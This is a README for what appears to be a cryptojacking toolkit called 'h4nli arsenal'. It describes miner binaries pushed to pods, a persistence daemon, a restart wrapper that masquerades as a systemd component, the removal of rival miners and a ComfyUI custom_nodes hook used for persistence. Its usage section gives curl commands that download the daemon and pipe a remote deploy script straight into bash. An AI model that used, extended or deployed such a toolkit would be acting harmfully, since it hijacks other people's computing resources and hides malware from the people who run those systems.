# h4nli arsenal

Deploy scripts + miner binaries pulled by pods over HTTPS (raw.githubusercontent.com).

## Layout
- `h4pdx.py` — self-healing daemon (S3/local bin sync, reap zombies, periodic status)
- `deploy.sh` — one-shot remote deploy (idempotent gate, rival cleanup, wrapper start)
- `wdwrap.sh` — restart wrapper (masquerades as systemd component)
- `zz_h4pdx.py` — custom_nodes hook (ComfyUI persistence)
- `bin/peakminer` — Linux v2.19.1 (md5 c32b1b6c)
- `bin/peakminer.exe` — Windows v2.19.3
- `MANIFEST.md5` — pinned checksums (verify before exec)

## Usage (pod side)
    curl -fsSL https://raw.githubusercontent.com/<owner>/<repo>/main/h4pdx.py -o /root/.cc/h4pdx.py
    bash <(curl -fsSL https://raw.githubusercontent.com/<owner>/<repo>/main/deploy.sh)

Always verify md5 against MANIFEST.md5 before executing.
